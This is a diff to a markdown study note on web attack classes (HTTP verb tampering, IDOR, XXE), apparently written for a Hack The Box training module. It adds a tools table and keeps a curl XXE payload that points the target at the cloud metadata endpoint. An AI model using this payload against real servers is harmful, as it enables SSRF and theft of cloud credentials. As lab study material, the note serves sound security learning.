@@ -1,6 +1,23 @@
 # Web Attacks
 
-Covers HTTP Verb Tampering, IDOR, and XXE — the three core web attack classes in the HTB Web Attacks module.
+#WebAttacks #IDOR #XXE #HTTPVerbTampering #WebAppAttacks
+
+
+## What is this?
+
+Three core web attack classes: HTTP Verb Tampering, IDOR, and XXE. Use alongside Burp for intercepting and manipulating requests. Pairs with [[SQL Injection]], [[File Inclusion]], [[CORS Misconfiguration]].
+
+
+---
+
+## Tools
+
+| Tool | Purpose |
+|---|---|
+| `Burp Suite` | Intercept and replay requests, modify verbs, test IDOR IDs, inject XXE payloads |
+| `curl` | Verb tampering (`-X`), IDOR probing, XXE payload delivery |
+| `ffuf` | IDOR enumeration — fuzz numeric/UUID object references |
+| `XXEinjector` | Automated XXE exploitation — `git clone https://github.com/enjoiz/XXEinjector` |
 
 ---
 
@@ -381,3 +398,9 @@ curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d
 # XXE — SSRF to metadata
 curl -s -X POST "http://<target>/endpoint" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>'
 ```
+
+---
+
+*Created: 2026-03-04*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
